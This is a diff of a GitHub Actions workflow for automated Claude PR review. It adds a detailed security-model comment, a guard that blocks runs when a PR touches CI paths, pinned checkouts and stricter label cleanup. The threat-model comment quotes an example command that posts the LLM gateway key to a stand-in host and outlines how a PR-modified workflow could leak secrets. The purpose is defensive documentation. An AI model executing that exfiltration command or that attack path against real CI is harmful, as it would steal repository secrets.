@@ -3,47 +3,110 @@ name: Claude Auto Review
 # Triggered when the 'claude-review' label is applied to a PR, OR manually via
 # workflow_dispatch with a PR number (smoke-test escape hatch).
 #
-# This workflow uses `pull_request` (NOT `pull_request_target`). The choice is
-# deliberate -- pull_request_target has a long history of CVEs caused by the
-# pattern "checkout PR HEAD with secrets in env", and we don't need its
-# headline feature (giving fork PRs access to repo secrets) because:
-#   - The contract for this workflow is "internal contributors only"; fork PRs
-#     are gated out via the same-repo check in the review job's `if:`.
-#   - Maintainers are the only ones who can apply the 'claude-review' label
-#     (triage permission or higher), so even with `pull_request` the trigger
-#     is maintainer-gated.
+# =====================================================================================
+# SECURITY MODEL -- READ THIS BEFORE MODIFYING THE TRIGGER
+# =====================================================================================
+# This workflow uses `pull_request` (NOT `pull_request_target`).
 #
-# Trade-offs we accept by using `pull_request`:
-#   - The workflow file itself is read from the PR HEAD, not from develop. A
-#     PR author with push access to this repo could in principle modify the
-#     workflow file in their PR. They already have push access to develop, so
-#     this is not a new privilege; the threat model assumes write-access
-#     contributors are trusted.
-#   - The `.claude/skills/` and `.github/scripts/` directories are also from
-#     PR HEAD. We still overlay them from origin/<default-branch> at the top
-#     of the review job (see the "Overlay" step below) so accidental or
-#     drive-by modifications by a PR are reverted before they reach the
-#     trusted sanitizer / model-instruction code paths. This is now
-#     defense-in-depth rather than a hard security boundary -- a hostile PR
-#     with write access could modify the workflow to skip the overlay -- but
-#     a tampered workflow file would be visible in the PR diff, so the
-#     control still raises the bar for an attacker.
+# The choice is deliberate but it has an UNFIXABLE-FROM-INSIDE-THE-WORKFLOW
+# residual risk that we mitigate via repo configuration + maintainer
+# procedure. If you are tempted to make trigger or hardening changes,
+# understand the full picture first.
 #
-# What we keep from the `pull_request_target` hardening:
-#   - SHA-pinned checkout (closes the TOCTOU race between label-apply and
-#     checkout, regardless of trigger).
-#   - persist-credentials: false on every checkout.
-#   - Two-job split (LLM Gateway secrets in `review`, GitHub write token in
-#     `post` -- the secret-isolation argument is independent of the trigger).
-#   - Sanitizer + JSON Schema + per-string caps + secret/env-var scans.
-#   - Concurrency cancel-in-progress.
+# Why pull_request and not pull_request_target?
+#   pull_request_target has a long history of CVEs caused by the pattern
+#   "checkout PR HEAD with secrets in env, then run user-controlled code".
+#   Our prior design mitigated that class of CVE through the overlay step
+#   + --allowedTools restrictions + sanitizer + two-job split. Using
+#   pull_request removes that entire CVE class as a concern (under
+#   pull_request, fork PRs run with empty secrets, so the secrets-in-env
+#   pattern simply doesn't apply to them) and keeps the in-workflow
+#   hardening as defense-in-depth.
+#
+# Residual risk introduced by `pull_request`:
+#   Under pull_request, the workflow file ITSELF is read from the PR HEAD.
+#   A contributor with push access to ANY same-repo branch (which is a
+#   strictly weaker bar than push-access to the protected default branch,
+#   and is also a weaker bar than read-access to repository secrets) can:
+#     1. Push a malicious branch.
+#     2. In their PR, modify this workflow file to remove --allowedTools,
+#        remove the overlay step, remove the sanitizer, merge the two
+#        jobs, or just `curl -X POST -d "$LLM_GATEWAY_KEY" evil.com` in
+#        any step.
+#     3. Wait for ANY user with `triage` permission (a strictly weaker
+#        bar than `write`, and explicitly different from "the contributor
+#        themselves") to apply `claude-review`.
+#     4. The PR-modified workflow runs with LLM_GATEWAY_KEY in env. The
+#        secret leaks.
+#   This attack is NOT mitigatable from inside the workflow because the
+#   workflow itself is what the attacker controls. Any in-workflow gate
+#   the attacker can simply remove from their PR.
+#
+# How we actually mitigate the residual risk -- THREE LAYERS, all required:
+#
+#   Layer 1: REPO CONFIGURATION (must be configured by a repo admin;
+#            this workflow file cannot enforce these on its own)
+#     - .github/CODEOWNERS lists .github/workflows/, .github/scripts/, and
+#       .claude/ as code-owner-protected paths. (Already in place; see
+#       the file for explanation.)
+#     - Branch protection on the default branch (`develop`) MUST require:
+#         * "Require a pull request before merging"
+#         * "Require review from Code Owners"
+#         * "Require approval of the most recent reviewable push"
+#         * "Restrict pushes that create matching branches" -- enforce
+#           even for admins, so direct pushes to develop are impossible
+#       Configure at: Settings -> Branches -> Branch protection rules.
+#     - Settings -> Actions -> General -> Approval is required for runs
+#       from public-fork PRs (set "Require approval for ALL outside
+#       collaborators"). This handles the contributor-without-write-access
+#       case orthogonally to the same-repo gate below.
+#
+#   Layer 2: MAINTAINER PROCEDURE (the most important layer; the only
+#            gate between "PR opened with malicious workflow" and "secrets
+#            leak", because Layer 1 only blocks MERGE, not RUN)
+#     - Before applying `claude-review` on ANY pull request, the
+#       maintainer MUST run:
+#           git fetch origin pull/<N>/head:pr-<N>
+#           git diff origin/develop...pr-<N> -- .github/ .claude/
+#       and verify that diff is empty (or, if non-empty, manually audit
+#       every line for malicious content -- removing the overlay step,
+#       removing --allowedTools, adding curl to evil.com, etc.).
+#     - If the PR legitimately needs to modify .github/ or .claude/,
+#       use the workflow_dispatch escape hatch INSTEAD of the label
+#       trigger -- workflow_dispatch runs from the default branch's
+#       trusted, code-owner-approved version of this file.
+#
+#   Layer 3: IN-WORKFLOW DEFENSE-IN-DEPTH (catches accidental
+#            misconfigurations and unsophisticated attackers; can be
+#            removed by a sophisticated attacker since the workflow is
+#            PR-controlled, but still raises the bar and reduces the
+#            blast radius of accidents)
+#     - The "Block if PR modifies CI security perimeter" step at the top
+#       of the review job will fail the run with a clear error message
+#       if the PR's diff against the base touches .github/workflows/,
+#       .github/scripts/, or .claude/. Forces the maintainer through the
+#       workflow_dispatch path consciously.
+#     - SHA-pinned checkout (closes TOCTOU race between label-apply and
+#       checkout).
+#     - persist-credentials: false on every checkout.
+#     - Overlay of .claude/ and .github/scripts/ from default branch
+#       (lower hard-guarantee under pull_request than under
+#       pull_request_target, but still useful against accidents).
+#     - --allowedTools=Skill,Read,Grep,Glob (no Bash, no Write, no MCP
+#       write tools, no network).
+#     - Two-job split (LLM secrets in `review`, GitHub write in `post`).
+#     - Sanitizer + JSON Schema + per-string caps + secret-pattern scans
+#       on the model output before it leaves Job 1.
+#     - Concurrency cancel-in-progress.
 #
 # Fork-PR UX:
 #   The same-repo gate in this workflow's `if:` causes review/post/cleanup
-#   to skip silently for fork PRs. The companion workflow
-#   claude_auto_review_fork_notify.yml fires on the same labeled event via
-#   pull_request_target (safe because it has no checkout step) and posts
-#   an explanatory comment with the workflow_dispatch escape-hatch link.
+#   to skip silently for fork PRs (under pull_request, fork PRs have no
+#   secrets so the secrets-bearing path can't run anyway). The companion
+#   workflow claude_auto_review_fork_notify.yml fires on the same labeled
+#   event via pull_request_target (safe because it has no checkout step
+#   and posts a hardcoded comment) and posts an explanatory comment with
+#   the workflow_dispatch escape-hatch link.
 #
 # Comments appear as github-actions[bot] (we do not use the Anthropic OIDC token
 # exchange that would let them appear as claude[bot]). Because that bot identity
@@ -179,6 +242,47 @@ jobs:
           # origin/<base>...HEAD` cannot resolve merge-base.
           fetch-depth: 0
           persist-credentials: false
+
+      # Layer 3 of the security model (see header). Blocks runs whose PR
+      # touches the CI security perimeter -- the paths whose contents
+      # control whether secrets are protected at runtime.
+      #
+      # This catches accidental modifications by legitimate contributors
+      # (which would otherwise silently disable security controls) and
+      # raises the bar for unsophisticated attackers. It is NOT a hard
+      # guarantee: a sophisticated attacker will simply remove this step
+      # from their PR-controlled workflow file before the run. The hard
+      # guarantees come from Layer 1 (CODEOWNERS + branch protection,
+      # which gate merge) and Layer 2 (maintainer procedure -- the only
+      # thing standing between "PR opened with a modified workflow" and
+      # "secrets leak", because Layer 1 only blocks merge, not run).
+      #
+      # Skipped on workflow_dispatch -- the maintainer using dispatch is
+      # making a conscious decision to review a PR that may touch CI,
+      # AND the workflow file they're running is the trusted default-
+      # branch version (Layer 1 already gated its merge).
+      - name: Block if PR modifies CI security perimeter (Layer 3 defense)
+        if: github.event_name == 'pull_request'
+        env:
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
+        run: |
+          set -euo pipefail
+          perimeter_changes=$(git diff --name-only "origin/${BASE_REF}...HEAD" \
+              | grep -E '^(\.github/workflows/|\.github/scripts/|\.claude/)' \
+              || true)
+          if [ -n "$perimeter_changes" ]; then
+            echo "::error::This PR modifies the CI security perimeter:"
+            echo "$perimeter_changes" | sed 's/^/  /'
+            echo ""
+            echo "Auto-review on a PR-modified workflow is unsafe -- the modification"
+            echo "could disable the very controls (--allowedTools restriction, sanitizer,"
+            echo "overlay, two-job split) that protect the LLM Gateway secrets in this job."
+            echo ""
+            echo "After auditing the diff, run the review via the dispatch path, which"
+            echo "uses the trusted, code-owner-approved workflow file from develop:"
+            echo "  Actions -> Claude Auto Review -> Run workflow -> enter PR number"
+            exit 1
+          fi
 
       # Restore .claude/ skills AND .github/scripts/ from the default branch
       # into the workspace. Both:
@@ -522,9 +626,23 @@ jobs:
       contents: read
       pull-requests: write
     steps:
+      # Checkout the DEFAULT BRANCH explicitly. We must NOT use the
+      # checkout default for this step:
+      #   - Under `pull_request` the checkout default ref is
+      #     refs/pull/N/merge, which contains the PR's copy of
+      #     .github/scripts/post_claude_review.sh.
+      #   - Under `pull_request_target` the default is the base branch,
+      #     which would be safe -- but pinning explicitly here is cheap
+      #     defense-in-depth so the post script's provenance does not
+      #     silently change if the trigger changes.
+      # The post job runs with pull-requests: write, so a PR-controlled
+      # post_claude_review.sh would be free to post arbitrary comments,
+      # set arbitrary labels, etc. Pinning to the default branch ensures
+      # only the trusted, develop-merged version of the script ever runs.
       - name: Checkout default branch (for post script)
         uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5  # v4
         with:
+          ref: ${{ github.event.repository.default_branch }}
           sparse-checkout: |
             .github/scripts
           persist-credentials: false
@@ -566,13 +684,38 @@ jobs:
       && github.event.pull_request.head.repo.full_name == github.repository
     runs-on: ubuntu-latest
     timeout-minutes: 5
+    # Label management on a PR goes through the /issues/.../labels API
+    # endpoint (PRs ARE issues in GitHub's data model -- "shared" actions
+    # like labels live on the issues endpoints per the REST docs). That
+    # endpoint requires `issues: write`, NOT `pull-requests: write`. We
+    # keep `pull-requests: write` listed in case future cleanup steps
+    # need PR-specific endpoints, but it is `issues: write` that actually
+    # authorizes the label DELETE below.
     permissions:
       pull-requests: write
+      issues: write
     steps:
       - name: Remove claude-review label
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          gh api --method DELETE \
-            "/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/labels/claude-review" \
-            || true
+          set -euo pipefail
+          # Selective error handling: 404 means the label was already
+          # removed (someone manually removed it, the post script removed
+          # it, etc.) and is the expected no-op case. Any OTHER failure
+          # (auth issue, rate limit, network blip) MUST surface as a job
+          # failure -- otherwise the label gets stuck applied and the
+          # maintainer can't retrigger by re-labeling, which defeats the
+          # entire purpose of having a separate cleanup job.
+          # The previous `|| true` swallowed all of these.
+          if output=$(gh api --method DELETE \
+                "/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/labels/claude-review" \
+                2>&1); then
+            echo "Removed claude-review label from PR #${PR_NUMBER}."
+          elif printf '%s' "$output" | grep -qE 'HTTP 404|Not Found'; then
+            echo "claude-review label already absent on PR #${PR_NUMBER}; nothing to do."
+          else
+            echo "::error::Failed to remove claude-review label from PR #${PR_NUMBER}"
+            printf '%s\n' "$output" >&2
+            exit 1
+          fi
